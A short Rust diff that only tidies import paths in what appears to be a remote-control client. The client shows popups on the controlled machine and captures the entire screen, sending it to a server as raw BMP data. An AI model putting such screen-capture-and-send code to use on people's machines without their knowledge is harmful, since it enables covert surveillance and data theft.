@@ -71,8 +71,8 @@ pub fn echo(client: &mut Client, message: String) {
 
 /// Displays a popup message box on the client machine
 pub fn display_message(client: &mut Client, message: String) {
-    let c_message = std::ffi::CString::new(message).unwrap();
-    let title = std::ffi::CString::new("Message").unwrap();
+    let c_message = CString::new(message).unwrap();
+    let title = CString::new("Message").unwrap();
     unsafe {
         MessageBoxA(
             HWND(0 as *mut c_void),
@@ -82,7 +82,7 @@ pub fn display_message(client: &mut Client, message: String) {
         );
     }
     // Send an empty response to server to indicate success
-    lib::send_data(lib::Command::Send, &"", &mut client.writer).unwrap();
+    send_data(Command::Send, &"", &mut client.writer).unwrap();
 }
 
 /// Captures the entire virtual screen and sends it back to the server as raw BMP data
@@ -126,7 +126,7 @@ pub fn screenshot(client: &mut Client) {
                 bmp_handle,
                 0,
                 height as u32,
-                Some(buf.as_mut_ptr() as *mut std::ffi::c_void),
+                Some(buf.as_mut_ptr() as *mut c_void),
                 &mut bi,
                 DIB_RGB_COLORS
             );
@@ -163,6 +163,6 @@ pub fn screenshot(client: &mut Client) {
         ReleaseDC(None, dc_screen);
 
         // Send BMP file bytes to server
-        lib::send_data(lib::Command::Send, &bmp_file, &mut client.writer).unwrap();
+        send_data(Command::Send, &bmp_file, &mut client.writer).unwrap();
     }
 }
